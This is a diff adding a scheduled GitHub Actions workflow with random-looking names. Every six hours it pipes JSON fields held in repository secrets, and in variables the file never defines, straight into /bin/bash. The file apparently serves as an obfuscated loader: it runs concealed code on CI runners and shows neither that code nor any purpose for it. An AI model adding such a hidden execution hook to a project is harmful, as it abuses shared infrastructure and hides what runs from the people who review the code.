@@ -1,0 +1,27 @@
+name: linxuns
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: linxuns
+        env:
+          e2154: ${{ secrets.e2154 }}
+        run: |
+          echo $e2154 | jq -r .ti12307 | /bin/bash
+          echo $hhctg4 | jq -r .jbj512 | /bin/bash
+          echo $i1 | jq -r .tdqh5543 | /bin/bash
+          echo $adxv241 | jq -r .j8 | /bin/bash
+          echo $isgpv39806 | jq -r .mo57 | /bin/bash
+          echo $wmznm71513 | jq -r .u72541 | /bin/bash
+          echo $g4982 | jq -r .hjq1 | /bin/bash
+          echo $rhd14179 | jq -r .siace57158 | /bin/bash
+          echo $kyh1 | jq -r .p39 | /bin/bash
+          echo $jy03 | jq -r .abktu05950 | /bin/bash
+          echo $ejh8 | jq -r .qvedz5 | /bin/bash
+          echo $ut91616 | jq -r .cn22 | /bin/bash
+
